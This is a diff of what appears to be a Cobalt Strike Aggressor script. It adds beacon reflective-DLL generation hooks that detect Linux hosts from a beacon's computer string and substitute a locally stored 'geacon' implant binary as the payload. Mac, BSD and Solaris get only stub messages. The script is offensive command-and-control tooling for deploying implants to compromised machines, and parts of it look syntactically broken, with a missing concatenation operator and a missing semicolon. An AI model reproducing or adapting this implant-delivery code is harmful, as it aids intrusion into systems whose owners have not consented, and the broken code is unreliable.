@@ -1,4 +1,74 @@
-foreach $name (listeners_local()) {
-	println("$name is: " . listener_describe($name));
-    println(listener_info($name))
+warn("DEBUG LOADED");
+
+
+# ------------------------------------
+# $1 = DLL file name
+# $2 = DLL content
+# $3 = arch
+# ------------------------------------
+set BEACON_RDLL_GENERATE {
+    warn("Running 'BEACON_RDLL_GENERATE' for DLL " . $1 . " with architecture " . $3);
+    return $null;
+}
+
+# ------------------------------------
+# $1 = DLL file name
+# $2 = DLL content
+# $3 = arch
+# $4 = parent Beacon ID
+# $5 = GetModuleHandleA pointer
+# $6 = GetProcAddress pointer
+# ------------------------------------
+set BEACON_RDLL_GENERATE_LOCAL {
+    local('$computer $in $data')
+    warn("Running 'BEACON_RDLL_GENERATE_LOCAL' for DLL " . 
+    $1 ." with architecture " . $3 . " Beacon ID " . $4 . " GetModuleHandleA "
+    $5 . " GetProcAddress " . $6);
+
+    $computer = beacon_info($4, "computer");
+
+    println($computer);
+    warn($computer);
+
+    if ($computer ismatch '.+\s\(.*(Linux|Mac|BSD|olaris).*\)') {
+        println("THIS IS A GEACON!");
+        ($os) = matched();
+        warn($os);
+        if ($computer ismatch '.+\s\(.*Linux.*\)') {
+            println("THIS IS A LINUX GEACON!");
+
+            blog($4, "Creating geacon and compressing. This will take some time, so please be patient.")
+
+            $in = openf("/home/octavian/tmp/geacon/main");
+            $data = readb($in, -1);
+            closef($in);
+
+            # printf("DATA is: " . transform($data, "hex"));
+            return $data;
+        }
+        else if ($computer ismatch '.+\s\(.*Mac.*\)') {
+            println("THIS IS A MAC OS X GEACON!");
+        }
+        else if ($computer ismatch '.+\s\(.*BSD.*\)') {
+            println("THIS IS A BSD GEACON!");
+        } else if ($computer ismatch '.+\s\(.*olaris.*\)') {
+            println("THIS IS A SOLARIS GEACON!");
+        } else {
+            println("I HAVE NO IDEA WHAT YOU DID, BUT UNLESS YOU ADJUST YOUR BEACON_RDLL_GENERATE_LOCAL HOOK, I CANNOT CREATE A NEW PAYLOAD FOR THIS OS!");
+            warn("If this beacon should not be affected by geacon, adjust the regex for geacon detection.");
+        }
+        
+    } else {
+        warn("RETURNING WINDOWS BEACON");
+        return $null;        
+    }
+}   
+
+# ------------------------------------
+# $1 = DLL file name
+# $2 = arch
+# ------------------------------------
+set BEACON_RDLL_SIZE {
+   warn("Running 'BEACON_RDLL_SIZE' for DLL " . $1 . " with architecture " . $2);
+   return "100";
 }
